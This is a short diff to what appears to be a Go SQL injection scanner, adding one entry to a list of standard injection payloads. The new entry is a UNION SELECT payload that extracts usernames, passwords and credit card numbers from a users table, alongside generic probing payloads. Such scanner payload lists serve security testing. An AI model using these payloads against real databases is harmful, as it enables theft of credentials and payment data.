@@ -29,6 +29,7 @@ var sqliPayloadsStandard = []string{
 	"1; SELECT 1", "1'; SELECT 1--",
 	"1' ORDER BY 1--", "1' ORDER BY 100--",
 	"1' GROUP BY 1--",
+	"' UNION SELECT 1, username, password, credit_card, 5, 6 FROM users --",
 	"1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
 	"1' UNION SELECT NULL,NULL,NULL--", "1' UNION SELECT 1,2,3--",
 	"1' UNION ALL SELECT NULL--",
